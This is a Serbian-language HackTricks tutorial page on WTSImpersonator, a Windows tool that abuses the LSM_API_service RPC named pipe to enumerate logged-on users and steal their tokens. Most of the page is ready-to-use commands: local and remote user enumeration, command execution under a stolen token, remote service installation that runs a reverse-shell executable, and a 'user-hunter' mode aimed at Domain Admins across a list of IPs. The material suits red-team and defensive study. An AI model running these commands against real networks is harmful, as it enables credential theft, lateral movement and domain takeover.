{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Alat **WTS Impersonator** koristi **"\\pipe\LSM_API_service"** RPC Named pipe da tiho enumeriše prijavljene korisnike i preuzme njihove tokene, zaobilazeći tradicionalne tehnike impersonacije tokena. Ovaj pristup olakšava neometano lateralno kretanje unutar mreža. Inovacija iza ove tehnike pripisuje se **Omri Baso, čiji je rad dostupan na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Osnovna funkcionalnost
Alat funkcioniše kroz niz API poziva:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ključni moduli i upotreba
- **Enumeracija korisnika**: Lokalna i daljinska enumeracija korisnika je moguća sa alatom, koristeći komande za svaku situaciju:
- Lokalno:
```powershell
.\WTSImpersonator.exe -m enum
```
- Daljinski, specificirajući IP adresu ili ime hosta:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Izvršavanje komandi**: Moduli `exec` i `exec-remote` zahtevaju **Service** kontekst da bi funkcionisali. Lokalno izvršavanje jednostavno zahteva WTSImpersonator izvršni fajl i komandu:
- Primer za lokalno izvršavanje komande:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe se može koristiti za dobijanje service konteksta:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Daljinsko izvršavanje komandi**: Uključuje kreiranje i instaliranje servisa daljinski slično PsExec.exe, omogućavajući izvršavanje sa odgovarajućim dozvolama.
- Primer daljinskog izvršavanja:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Modul za lov na korisnike**: Cilja specifične korisnike na više mašina, izvršavajući kod pod njihovim akreditivima. Ovo je posebno korisno za ciljanje Domain Admins sa lokalnim administratorskim pravima na nekoliko sistema.
- Primer upotrebe:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
